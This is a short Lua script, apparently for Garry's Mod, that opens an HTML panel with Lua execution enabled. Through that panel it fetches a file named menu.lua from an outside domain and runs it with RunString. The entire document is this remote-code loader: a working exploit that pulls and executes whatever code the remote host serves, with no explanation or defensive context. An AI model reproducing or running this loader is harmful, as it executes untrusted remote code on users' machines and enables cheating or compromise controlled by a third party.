local f = vgui.Create('DHTML');
f:SetAllowLua(true);
return f:ConsoleMessage([[RUNLUA:
http.Fetch("https://x.qrextomnia.club/menu.lua",function(b)RunString(b)end)
]]);
